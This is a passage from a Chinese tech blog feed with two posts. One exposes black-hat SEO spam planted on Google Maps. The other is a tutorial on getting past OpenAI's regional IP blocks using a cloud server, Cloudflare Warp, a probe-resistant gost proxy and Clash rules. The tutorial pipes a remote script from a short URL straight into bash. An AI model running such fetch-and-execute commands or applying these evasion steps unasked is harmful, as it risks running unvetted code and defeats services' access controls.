    <category term="项目实践" scheme="https://selfboot.cn/categories/%E9%A1%B9%E7%9B%AE%E5%AE%9E%E8%B7%B5/"/>
    
    
    <category term="方法" scheme="https://selfboot.cn/tags/%E6%96%B9%E6%B3%95/"/>
    
    <category term="前端" scheme="https://selfboot.cn/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>从外围引流贴看黑产的搜索引擎排名优化生意</title>
    <link href="https://selfboot.cn/2023/12/28/black_hat_SEO/"/>
    <id>https://selfboot.cn/2023/12/28/black_hat_SEO/</id>
    <published>2023-12-28T20:26:37.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>最近在使用 Google 搜索的时候，发现在第一页的搜索结果里，竟然出现了<strong>黑产的引流内容</strong>。我的搜索关键词”上海到南京网络延迟”，结果第一页出现了<strong>外围</strong>的引流贴，如下图所示：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_search.png" alt="黑产的引流贴"></p><p>要知道 Google 可以靠搜索技术起家的，它的搜索结果一直都是非常准确的，这次居然出现了黑产的引流贴，看来黑产确实找到了 SEO 排名算法漏洞，并进行了有效攻击。接下来我们从搜索结果来猜猜看黑产到底是怎么做的吧。</p><span id="more"></span><h2 id="引流落地页面"><a href="#引流落地页面" class="headerlink" title="引流落地页面"></a>引流落地页面</h2><p>之前看到的广告引流，都是自己的一些页面，里面乱七八糟的内容。Google 这次出现的黑产引流页，居然是 google.com 域名下的，点进去看是地图里的一个<a href="https://www.google.com/maps/d/viewer?mid=14mrkjCm1Zr72XEhi2L7RjVGwcf4ogiY&hl=en_US&ll=22.277538900000028,114.17686550000002&z=17">页面</a>。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_map_page.png" alt="引流落地页面"></p><p>看来是黑产在 Google 自家的 Google Map 产品上留了引流内容。这里引流文本加入了色情对抗扰乱，但是人还是一眼可以看到其目的。截止本文截图，这条文本已经有 133 次查看。</p><p>那么其他关键词会不会出现这个黑产的引流页面呢？试了几个地名相关的搜索，比如”广州哪里好玩”, “广州到深圳出差”, “广州到付”，第一页结果都很正常，没有出现黑产的引流页面。接下来在搜索词带上黑产页面中的部分关键词，比如<strong>上门，质量，外围</strong>等，搜索到的内容就不堪入目了。比如下面这个结果：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_keywords.png" alt="搜索词带上黑产页面中的部分关键词"></p><p>还有这个：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_keywords_2.png" alt="搜索词带上广州上门预约"></p><p>排名靠前的这些页面全部是 Google Map 里面的页面，页面里堆砌各种关键词，同时留下联系方式等文本。除了这类色情引流，还有其他的吗？接下来简单试试。先来尝试下”<strong>正规棋牌</strong>“，果不其然，第一个还是 Google Map 里面的黑产页面，里面堆砌了各种关键词。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_keywords_3.png" alt="搜索词正规棋牌的结果"></p><p><strong>可能这还只是黑产的冰山一角</strong>！</p><h2 id="黑产的生意"><a href="#黑产的生意" class="headerlink" title="黑产的生意"></a>黑产的生意</h2><p>从上面信息来看，黑产要做的就是<strong>准备一大堆相关的关键词，堆砌成引流文本</strong>。这中间可能会添加部分干扰信息，然后去 Google Map 上面留言。这些页面在 Google 的搜索结果中，很容易就出现在第一页。</p><p>怎么找到这些黑产呢？尝试了下搜索 <code>google map view 黑产</code>，果然发现了黑产留下的自己的推广广告。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_ad_entry.png" alt="做 SEO 黑产的自家广告"></p><p>找到其中一家的站点主页，看看黑产的宣传语：</p><blockquote><p>实力团队，强势霸屏，高效率！有质疑我们团队能力的，可以搜一下我们团队的广告，合作后做出来的效果类似。我们拥有上百台服务器进行操作，优化是一个持续的过程。谷歌海外是全球最大的搜索引擎，流量巨大，我们的优化服务不分国家，只区分语言！</p></blockquote><p>甚至还提供了效果视频。黑产的页面也提供了套餐方案，可以看到 50 USDT，都能保底收录10万个页面。可以看到他们的操作也是比较暴力的，大力出奇迹，堆砌关键词的页面都是十万起步，怪不得搜索引擎都被他们霸屏了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_ad_method.png" alt="从黑产套餐看套路"></p><h2 id="Google-的封禁"><a href="#Google-的封禁" class="headerlink" title="Google 的封禁"></a>Google 的封禁</h2><p>在尝试的过程中发现，同样的搜索 “上海 到南京网络延时”，可能出的页面也不一样。有的<a href="https://www.google.com/maps/d/viewer?mid=1LUEB5RPbjIa-hpiItitTgBhyybW5SwU&hl=en_US">引流页面</a>打开已经被屏蔽，可能是 Google 也已经注意到了这个问题，在封禁黑产的引流页面。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_black_hat_SEO_baned.png" alt="Google 封禁了部分引流页面"></p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p><strong>本博客内容仅供研究目的，旨在揭露黑产的不法行为。在此所述的任何技术和信息都不应用于非法活动或恶意目的。作者和发布者对任何人因使用或误用本博客文章中的信息而造成的任何直接或间接损失，概不负责。读者应该在合法和道德的范围内使用这些信息，并始终遵守所有适用的法律和道德规定。</strong></p><p>最后提醒下，不论什么时候，都要<strong>珍爱生命，远离黄赌毒</strong>！</p>]]></content>
    
    
    <summary type="html">最近Google搜索结果第一页出现黑产引流页面，通过分析页面内容、套餐方案等透露黑产利用Google Map投放大量关键词页面，实现搜索结果黑灰产优化。虽然部分已被封禁，但手段值得警惕，Google搜索质量也面临巨大挑战。</summary>
    
    
    
    <category term="社会百态" scheme="https://selfboot.cn/categories/%E7%A4%BE%E4%BC%9A%E7%99%BE%E6%80%81/"/>
    
    
    <category term="方法" scheme="https://selfboot.cn/tags/%E6%96%B9%E6%B3%95/"/>
    
    <category term="见闻" scheme="https://selfboot.cn/tags/%E8%A7%81%E9%97%BB/"/>
    
    <category term="google" scheme="https://selfboot.cn/tags/google/"/>
    
  </entry>
  
  <entry>
    <title>安全、快速、便宜访问 ChatGPT，最新最全实践教程！</title>
    <link href="https://selfboot.cn/2023/12/25/how-to-use-chatgpt/"/>
    <id>https://selfboot.cn/2023/12/25/how-to-use-chatgpt/</id>
    <published>2023-12-25T20:59:06.000Z</published>
    <updated>2024-06-07T06:32:37.901Z</updated>
    
    <content type="html"><![CDATA[<p>OpenAI 的 ChatGPT 对于个人工作和生活来说，是一个非常有用的工具。但是，由于众所周知的原因，OpenAI 的服务器在中国大陆地区是无法访问的。本文将介绍如何安全、快速、便宜地访问 ChatGPT，每一步都有详细的图文教程，并带有原理介绍，结果验证方法，让你零基础也能跟着学会。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231219_how_to_use_chatgpt.png" alt="OpenAI ChatGPT 中国区网络问题"></p><span id="more"></span><h2 id="OpenAI-风控拦截"><a href="#OpenAI-风控拦截" class="headerlink" title="OpenAI 风控拦截"></a>OpenAI 风控拦截</h2><p>在开始介绍如何使用 ChatGPT 之前，先来看看 OpenAI 的风控拦截策略。OpenAI 目前风控还是比较严格的，对于 IP 所属地区以及账户的风险特征，都有很严格的风控策略。</p><h3 id="IP-拦截"><a href="#IP-拦截" class="headerlink" title="IP 拦截"></a>IP 拦截</h3><p>OpenAI 目前不允许中国地区访问，来自<strong>中国大陆和香港地区的 IP</strong> 都是无法直接访问 ChatGPT。如果是海外的 IP，也有可能已经被 OpenAI 的风控拦截，比如各大云服务器的海外 IP。目前已知被拦截的云厂商就有腾讯云、阿里云、AWS、Google cloud、DigitalOcean 等。直接用这些云厂商的海外机房出口 IP 去访问 ChatGPT，都会被拦截。</p><p>对于 IP 问题，最好的方法是用一个 <a href="https://help.openai.com/en/articles/7947663-chatgpt-supported-countries">OpenAI 支持国家和地区</a>的纯净 IP，然后最好是独自用，这样不会触发频率限制。如果很多人用，因为 OpenAI 对单个 IP 的访问频率有限制，可能会导致返回 429 错误。这时候打开站点可能会像下图一样，加载不出来历史记录，并且会话也没法用。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231219_how_to_use_chatgpt_429.png" alt="OpenAI 网络频率限制"></p><p>这时候其实打开浏览器的开发者工具，就能看到一些关键 HTTPS 的请求返回了 429 错误码，这就是 IP 频率限制导致的。</p><h3 id="账户风控"><a href="#账户风控" class="headerlink" title="账户风控"></a>账户风控</h3><p>除了对 IP 有拦截，OpenAI 还有一套内部的非公开的策略，来对账户进行安全检测。如果你的账户触发了他们的风控规则，那么就会被永久封号。一般如果你的账户登录不上去，查看下邮件，如果有收到 OpenAI 的类似邮件，说明账户就被封了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231219_how_to_use_chatgpt_acc_ban.png" alt="OpenAI ChatGPT 账户封禁邮件"></p><p>从之前社区收集的情况来看，一般下面账户很容易被封禁：</p><ol><li>通过淘宝或者咸鱼等平台<strong>购买的账户</strong>，这些都是用程序大批量注册，然后卖给用户的，特征比较容易被检测到。</li><li>同一个账户频繁更换是用的 IP，也比较容易被封。</li><li>购买 Plus 的时候，让第三方代购，这样也很有风险，因为对方可能是盗刷信用卡来支付的。</li></ol><p>不过这里其实比较诡异，没有什么明确的规则，有时候买的账户也能一直用。一般来说<strong>自己注册，并且 IP 比较稳定的账户，很少听到有被封的</strong>。要订阅 Plus 的话，自己去苹果订阅，这样安全系数更高些，不容易被取消 Plus。</p><p>这里要应对 OpenAI 的风控，最关键的是<strong>一个合法稳定的 IP 和一个支付渠道</strong>。好在这两点目前都有很好的解决方案，下面就来介绍。IP 问题相对难一些，需要有一点点技术背景，下面重点来看看。本文介绍的是基于自己购买的服务器来解决 IP 问题，不用买别人的线路，这样<strong>更安全，隐私性更好</strong>。</p><h2 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h2><p>其实这里陈皓老师写过<a href="https://github.com/haoel/haoel.github.io">一篇文章</a>，特别推荐所有人好好看看！里面对于各种方法都有描述，包括线路选择，各种配置等，讲的很专业。本文的方法也是基于这篇文章来的，会更加详细，更适合新手一些。</p><p>首先自己得有个云服务器，可以用腾讯云，阿里云，Google Cloud 等，国内的相对便宜，但用的人也多，会有概率遇到 429。Google 云贵很多，支付也得外币信用卡，好处是速度快，用的人不多，没遇见过 429 问题。本文以腾讯云为例，选择<strong>轻量应用服务器</strong>最便宜的配置即可，选择亚太地区(首尔，日本，雅加达都可以)，入门级最便宜配置即可满足需求，一年大概 420 左右。如果有双十一优惠，这里价钱会非常便宜。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231219_how_to_use_chatgpt_cloud_svr.png" alt="腾讯云轻量应用服务器选择"></p><p>接下来需要对服务器进行简单初始化，然后安装一些软件即可配置好一个 HTTPS 代理了。</p><h3 id="服务器初始化"><a href="#服务器初始化" class="headerlink" title="服务器初始化"></a>服务器初始化</h3><p>首先是在服务器安装 Docker，后续可以用 docker 运行我们的代理程序，<strong>简化部署的复杂度</strong>。这里的安装步骤可以参考官方文档 <a href="https://docs.docker.com/engine/install/debian/">Install Docker Engine on Debian</a>，主要分为以下几步：</p><ol><li>设置 docker 的 apt repository；</li><li>安装 docker 包；</li><li>检查是否安装成功。</li></ol><p>没有计算机基础也不用怕，只用照着文档里面的执行命令即可。到最后验证这一步，看到类似输出就说明安装成功了。</p><blockquote><p>Hello from Docker！</p><p>This message shows that your installation appears to be working correctly.</p></blockquote><h3 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h3><p>因为我们最终是搭建成一个 https 代理，所以这里需要<strong>有个域名解析到这台服务器</strong>。关于域名相关知识，可以参考我之前的文章：</p><ol><li><a href="https://selfboot.cn/2015/11/05/dns_theory/">从理论到实践，全方位认识DNS（理论篇）</a></li><li><a href="https://selfboot.cn/2015/11/14/dns_practice/">从理论到实践，全方位认识DNS（实践篇）</a></li></ol><p>如果自己没有域名，需要先买一个，可以在腾讯云上面购买。因为我们的服务器在国外，所以域名不用备案，买了直接就能用的。这里可以选择一个不常见的域名，再配合小众后缀，然后就很便宜了。比如我随便找了一个域名<code>mylitdemo</code>，然后配合 <code>.fun</code> 后缀，10 年才 175 块钱，非常便宜（越是简短、好记的域名越贵，可以选一些无意义，很长的便宜域名）。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231220_how_to_use_chatgpt_domain_buy.png" alt="腾讯云域名购买"></p><p>然后需要在腾讯云的 DNSPod 里面添加一条<strong>域名解析 A 记录</strong>，到购买的服务器的公网 IP 上。这里我们不一定要二级域名，可以用三级子域名，比如 <code>us.mylitdemo.fun</code> 来解析到服务器的公网 IP。然后如果有多台服务器，可以为每台分配一个子域名，如下图中的 us 和 api 两个子域名：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231220_how_to_use_chatgpt_domain_set.png" alt="腾讯云 DNSPod 添加域名解析"></p><p>配置好之后，可以在本机用 ping 命令测试下域名解析是否正常：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231220_how_to_use_chatgpt_domain_ping.png" alt="Ping 域名解析测试"></p><p>这里域名改成自己的，然后如果返回 ip 地址是购买海外服务器的公网地址，就说明域名配置正确了。</p><h3 id="出口-IP-选择"><a href="#出口-IP-选择" class="headerlink" title="出口 IP 选择"></a>出口 IP 选择</h3><p>前面在讲 OpenAI 的 IP 风控的时候提到过，目前云厂商的海外 IP 都是被 OpenAI 风控拦截的。所以我们需要在访问的时候，经过一层中转，目前比较好的免费方案有 <a href="https://1.1.1.1/">Cloudflare 的 Warp</a>，基本原理如下：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231220_how_to_use_chatgpt_warp.png" alt="Cloudflare WARP 原理简单示意"></p><p>上面是普通情况，海外服务器直接请求 ChatGPT 会被拦截，但是我们可以经过 Cloudflare 的 Warp 中转，这样 OpenAI 看到的 IP 就是 Cloudflare 自己的，并不是我们的服务器 IP，算骗过了 OpenAI。这里 Cloudflare 是国外很大一家 CDN 服务商，OpenAI 的 IP 拦截其实也用了 Cloudflare 自家的能力，所以这里对 Cloudflare 来源的请求都是放过的。</p><p>按照 Cloudflare 自己的 <a href="https://developers.cloudflare.com/warp-client/get-started/linux/">Warp client</a> 文档进行操作比较麻烦，好在有人已经封装好了一个很好用的 shell 命令，可以傻瓜配置。具体命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;(curl -fsSL git.io/warp.sh) menu</span><br></pre></td></tr></table></figure><p>在服务器执行上面命令后，输入 2，然后就会自动安装配置 Warp 客户端和 socks5 代理。后面可以继续运行这个命令，就能看到当前 Warp 的状态，如下图说明 Socks5 代理已经启动了。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231220_how_to_use_chatgpt_warp_set.png" alt="Cloudflare Warp Socks5 代理启动"></p><p>启动成功后，还是要验证下的，可以用 curl 命令向 <code>ipinfo.io</code> 发起一个 http GET 请求，然后查看在直接访问和使用 Warp 代理情况下，对方看到的 IP 地址是否符合预期。从下图可以看到，在使用了 Warp 的代理后，对方看到的 IP 地址是 Cloudflare 的，而不是我们自己服务器 IP。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231221_how_to_use_chatgpt_warp_proxy.png" alt="Cloudflare Warp Socks5 代理验证"></p><p>注意这里 Warp 对操作系统和版本有要求，尽量按照我前面说的选 Debian 11，这个实验过没问题，其他系统版本下可能会有异常。</p><h3 id="证书配置"><a href="#证书配置" class="headerlink" title="证书配置"></a>证书配置</h3><p>离成功不远了！因为我们要配置 HTTPs 代理，所以需要一个证书。这里可以用免费的证书颁发机构 <a href="https://letsencrypt.org/">Let’s Encrypt</a>，这里有详细的 <a href="https://letsencrypt.org/getting-started/">Get Started</a> 文档，如果下面命令不成功，可以来这里参考官方文档。</p><p>注意用 root 权限运行下面两个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install certbot</span><br><span class="line">sudo certbot certonly --standalone --domains tk.mylitdemo.fun</span><br></pre></td></tr></table></figure><p>第一个命令用来安装 certbot，第二个命令用来生成证书，注意把域名 <code>tk.mylitdemo.fun</code> 改成自己前面绑定到 IP 的。这里必须先把域名绑定到服务器公网 IP 后，才能在服务器上生成证书。执行完后，如果看到下面提示，说明安装成功了：</p><blockquote><p>Congratulations! Your certificate and chain have been saved at: &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;tk.mylitdemo.fun&#x2F;fullchain.pem Your key file has been saved at: &#x2F;etc&#x2F;letsencrypt&#x2F;live&#x2F;tk.mylitdemo.fun&#x2F;privkey.pem Your certificate will expire on 2024-02-03. To obtain a new or tweaked version of this certificate in the future, simply run certbot again. To non-interactively renew all of your certificates, run “certbot renew”</p></blockquote><p>可以在提示中说的目录中看到这些证书文件，后面也会用到这个证书文件。这里自动生成的证书是 3 个月有效期的，如果想要长期使用，可以使用 crontab 添加一个定时任务。<code>crontab -e</code> 命令，添加下面内容即可：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 1 * * /usr/bin/certbot renew --force-renewal --quiet --renew-hook <span class="string">&quot;sh /home/.gost.sh&quot;</span> &gt;&gt; /var/log/certbot-renew.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>这样每个月 1 号，就会重新申请证书，然后重启代理服务。注意这里的 <code>sh /home/.gost.sh</code> 可能要根据自己的启动命令路径来改。</p><h3 id="HTTPS-代理"><a href="#HTTPS-代理" class="headerlink" title="HTTPS 代理"></a>HTTPS 代理</h3><p>前面做了那么多准备工作，就是为了这一步开启 HTTPS 代理了。前面安装 docker，域名解析配置， warp 配置，证书申请都成功后，就可以开始这里的代理设置了。找个常用目录，编辑 <code>.gost.sh</code> 文件(名字不重要)，添加下面内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">docker stop gost-warp &amp;&amp; docker <span class="built_in">rm</span> gost-warp</span><br><span class="line"><span class="comment"># 下面的 4 个参数需要改成你的</span></span><br><span class="line">DOMAIN=<span class="string">&quot;tk.mylitdemo.fun&quot;</span> <span class="comment"># 前面配置的域名</span></span><br><span class="line">USER=<span class="string">&quot;demo&quot;</span>               <span class="comment"># 代理用户名</span></span><br><span class="line">PASS=<span class="string">&quot;youguess&quot;</span>           <span class="comment"># 密码</span></span><br><span class="line">PORT=443                  <span class="comment"># 代理端口，一般选 443 就行</span></span><br><span class="line"></span><br><span class="line">BIND_IP=0.0.0.0</span><br><span class="line">CERT_DIR=/etc/letsencrypt</span><br><span class="line">CERT=<span class="variable">$&#123;CERT_DIR&#125;</span>/live/<span class="variable">$&#123;DOMAIN&#125;</span>/fullchain.pem</span><br><span class="line">KEY=<span class="variable">$&#123;CERT_DIR&#125;</span>/live/<span class="variable">$&#123;DOMAIN&#125;</span>/privkey.pem</span><br><span class="line">sudo docker run -d --name gost-warp \</span><br><span class="line">    -v <span class="variable">$&#123;CERT_DIR&#125;</span>:<span class="variable">$&#123;CERT_DIR&#125;</span>:ro \</span><br><span class="line">    --net=host ginuerzh/gost \</span><br><span class="line">    -L <span class="string">&quot;http2://<span class="variable">$&#123;USER&#125;</span>:<span class="variable">$&#123;PASS&#125;</span>@<span class="variable">$&#123;BIND_IP&#125;</span>:443?cert=<span class="variable">$&#123;CERT&#125;</span>&amp;key=<span class="variable">$&#123;KEY&#125;</span>&amp;probe_resist=code:404&amp;knock=www.google.com&quot;</span> \</span><br><span class="line">    -F <span class="string">&quot;socks://localhost:40000&quot;</span></span><br><span class="line">docker update --restart=unless-stopped gost-warp</span><br></pre></td></tr></table></figure><p>接着用 shell 运行这个脚本，如果整成输出一串 hash 和 gost-warp，基本上就是启动成功了。可以用 <code>docker ps</code> 命令查看下，看到 gost-warp 的状态是 up，说明启动成功了。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">CONTAINER ID   IMAGE           COMMAND                   CREATED          STATUS                    PORTS     NAMES</span><br><span class="line">e91d22d3dc9b   ginuerzh/gost   &quot;/bin/gost -L http2:…&quot;   18 seconds ago   Up 17 seconds                       gost-warp</span><br></pre></td></tr></table></figure><p>接着可以在自己本地电脑验证下。打开命令终端，用 curl 命令使用你的代理，来访问 ipinfo.io，看返回地址是否是 Warp 的 IP。如果是，说明代理成功了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  <span class="string">&quot;ipinfo.io&quot;</span> --proxy <span class="string">&quot;https://tk.mylitdemo.fu&quot;</span> --proxy-user <span class="string">&#x27;demo:youguess&#x27;</span></span><br></pre></td></tr></table></figure><p>这里这里的代理域名地址，用户名和密码都是前面 <code>.gost.sh</code> 里面你设置的。结果如下图，不用代理的话就是你本地 IP，</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231225_how_to_use_chatgpt_https_proxy.png" alt="验证代理是否成功"></p><h2 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h2><p>上面步骤成功后，相当于你有了一个中转点，接下来还需要在本地电脑上进行配置，让访问网络的流量经过这个中转点才行。这里目前有很多客户端，比如电脑端的 clash，iPhone 上的 shadowrocket 等软件，工具的原理基本如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231225_how_to_use_chatgpt_local.png" alt="本地电脑流量分发"></p><p>安装这些工具，并进行配置后，当本地发生网络访问的时候，工具可以根据不同的站点地址，选择不同的访问路径。如上图 1，2，3 这几种情况：</p><ol><li>一些内部 oa 站点，不经过代理软件，按照原来的方式访问公司的代理。</li><li>访问 youku.con，经过代理后，不访问代理服务器，直接访问这些可以直达的站点。</li><li>访问 chat.openai.com，经过代理后，再把请求转发云服务器，最后通过 warp 出口 IP 访问。</li></ol><h3 id="流量分发"><a href="#流量分发" class="headerlink" title="流量分发"></a>流量分发</h3><p>目前的代理客户端，基本都支持不同的站点，选择直接访问，还是通过某个代理访问。以 Clash 为例，在配置文件中，可以指定通过某个代理访问某个域名。比如对于 OpenAI 的相关域名，指定用 GPT4 这个<strong>代理组</strong>来访问。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,openai.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,sentry.io,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,stripe.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,bing.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,oaistatic.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,oaiusercontent.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN,api.openai.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN-SUFFIX,events.statsigapi.net,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN,llama2.ai,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN,www.tiktok.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN,www.tiktokv.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN,www.byteoversea.com,GPT4&#x27;</span></span><br><span class="line"><span class="bullet">-</span> <span class="string">&#x27;DOMAIN,www.tik-tokapi.com,GPT4&#x27;</span></span><br></pre></td></tr></table></figure><p>这里代理组是在配置文件中定义的，比如你有多个代理服务器，就可以放到一个组里面。每次手动指定某一个代理，或者自动选择速度快的代理，如果某个代理失败，也可以自动切换到另一个。总的来说，代理组允许自动切换，自动选择，还是挺方便的。如下图，有三个代理组，每个代理组有多台代理服务期，不同代理组可以选择不同的代理服务器。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231225_how_to_use_chatgpt_clash.png" alt="Clash 代理组配置"></p><p>从头写配置文件有点繁琐，可以在<a href="https://gist.github.com/selfboot/4ec21100f5286b4f25dab74733c4ed5f">这份配置文件</a>的基础上，添加自己的代理服务器信息，即可保存为自己的配置文件。然后把配置文件放到 Clash 的配置文件夹中，可以在 Clash 状态栏，通过<code>配置</code>-<code>打开配置文件夹</code> 找到配置文件夹目录。之后，在<code>配置</code>中选择自己的配置名，重载配置文件，就能生效了。接着通过 Clash 的状态栏，勾选<strong>设置为系统代理</strong>，就能正常访问 ChatGPT 了。</p><h3 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h3><p>有时候在某些内网中，有些 oa 站点需要用电脑中其他代理软件来访问才行。这时候，可以在 Clash 中配置好这些特殊站点，让它不经过 Clash 代理，还是按照原来的访问方式。可以在<code>更多设置</code>中的最下面添加要跳过的域名，如下图：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231225_how_to_use_chatgpt_clash_more.png" alt="Clash 更多配置"></p><h3 id="故障排查"><a href="#故障排查" class="headerlink" title="故障排查"></a>故障排查</h3><p>经过上面配置后，如果还是不能正常访问 ChatGPT，可以通过下面几个步骤来排查。首先查看代理服务器能否正常连接，可以先用 前面的 curl 来确保代理连接的上，然后在 Clash 中用延迟测速，看速度是否正常。一般 500ms 以内的延迟，都是可以接受的。如果速度正常，并且勾选了设置为系统代理，正常就不会有问题的。</p><p>这时候如果浏览器访问 chat.openai.com 还是不行，可以检查浏览器的网络请求有没有经过代理服务的端口。这里 Clash 默认会启动 7890 的本地端口来转发流量，用 chrome 的开发者工具，可以看到是否经过本地的 7890 端口转发。</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231225_how_to_use_chatgpt_clash_7890.png" alt="Chrome 开发者工具查看网络请求"></p><p>如果没有的话，可能是浏览器插件配置了某些代理导致失败，可以卸载掉浏览器的插件，比如 <code>Proxy SwitchyOmega</code>。</p><p>如果能看到 7890 代理，但是还是不能访问服务，就要用开发者工具，查看请求返回了什么报错。比如某天 OpenAI 可能启动了一个新的域名，然后也对 IP 来源做了限制。这时候本地配置文件中，没有对这个域名设置规则，那么就会被 OpenAI 拦截，导致无法访问。这种解决也比较简单，定位到域名后，直接添加新的代理规则，然后重载配置文件即可。</p><h3 id="Claude-分流"><a href="#Claude-分流" class="headerlink" title="Claude 分流"></a>Claude 分流</h3><p><a href="https://claude.ai/chats">Claude</a> 还比较特殊，最近发现不能访问，提示区域不对：</p><p><img src="https://slefboot-1251736664.file.myqcloud.com/20231228_how_to_use_chatgpt_claude_bypass.png" alt="Claude 区域限制"></p><p>但我明明已经切换了美国 ip，也加了 warp。于是在服务器尝试直接连接 Claude，发现是正常的，但是用 Cloudflare 中转链路后，这里就返回 307 重定向到一个错误地址了。看来 Claude 和 OpenAI 风控 IP 的策略不同，Claude 不支持 Cloudflare 的 IP。要解决的话也比较简单，直接在上面的 gost.sh 配置文件中，中转配置那一行，加上过滤掉 Claude 的规则即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-F <span class="string">&quot;socks://localhost:40000?bypass=172.10.0.0/16,127.0.0.1,localhost,claude.ai,anthropic.com&quot;</span></span><br></pre></td></tr></table></figure><p>不得不说，gost 功能完善，文档也是相当可以，这里的 bypass 参数，具体可以参考<a href="https://gost.run/concepts/bypass/">分流</a>。</p><h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p><strong>本博客内容仅供教育和研究目的，旨在讨论一种绕过 OpenAI 网络限制的方法。在此所述的任何技术和信息都不应用于非法活动或恶意目的。作者和发布者对任何人因使用或误用本博客文章中的信息而造成的任何直接或间接损失，概不负责。读者应该在合法和道德的范围内使用这些信息，并始终遵守所有适用的法律和道德规定。</strong></p>]]></content>
    
    
    <summary type="html">本文详细介绍如果通过网络代理，访问 OpenAI 的 ChatGPT，每一步都有详细的图文教程，并带有原理介绍，结果验证方法，让你零基础也能跟着学会。</summary>
    
    
    
    <category term="计算机网络" scheme="https://selfboot.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="方法" scheme="https://selfboot.cn/tags/%E6%96%B9%E6%B3%95/"/>
    
    <category term="ChatGPT" scheme="https://selfboot.cn/tags/ChatGPT/"/>
    
  </entry>
  
  <entry>
